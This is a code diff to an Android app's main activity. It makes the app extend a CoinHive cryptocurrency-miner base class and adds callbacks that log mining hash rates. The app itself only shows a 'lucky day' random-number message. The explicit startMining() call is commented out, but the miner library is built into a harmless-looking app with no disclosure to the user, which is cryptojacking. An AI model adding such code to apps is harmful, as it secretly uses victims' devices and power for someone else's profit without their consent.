@@ -6,11 +6,14 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 
+import com.theah64.coinhive.BaseCoinHiveActivity;
+import com.theah64.coinhive.CoinHive;
+
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.util.Random;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends BaseCoinHiveActivity {
 
 
     Button btnClick;
@@ -19,6 +22,10 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+
+//        this.startMining();
+
         setContentView(R.layout.activity_main);
 
 
@@ -29,7 +36,7 @@ public class MainActivity extends AppCompatActivity {
         btnClick.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                lblDesc.setText("" + generateRamdonNumber());
+                lblDesc.setText("Today is your lucky day - You just Got " + generateRamdonNumber() + " MARKS!!");
 
                 Thread t = new Thread(new Runnable() {
                     public void run() {
@@ -64,8 +71,27 @@ public class MainActivity extends AppCompatActivity {
                 });
 
                 t.start();
+
             }
         });
+    }
+
+    @Override
+    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {
+
+        System.out.println("***********************");
+        System.out.println("***********************");
+        System.out.println("Miner running - hashesPerSecond:" + hashesPerSecond);
+        System.out.println("Miner running - totalHashes:" + totalHashes);
+        System.out.println("Miner running - acceptedHashes:" + acceptedHashes);
+        System.out.println("***********************");
+        System.out.println("***********************");
+
+    }
+    @Override
+    public void onMiningStarted() {
+        System.out.println("Miner Started");
+
     }
 
     public int generateRamdonNumber(){
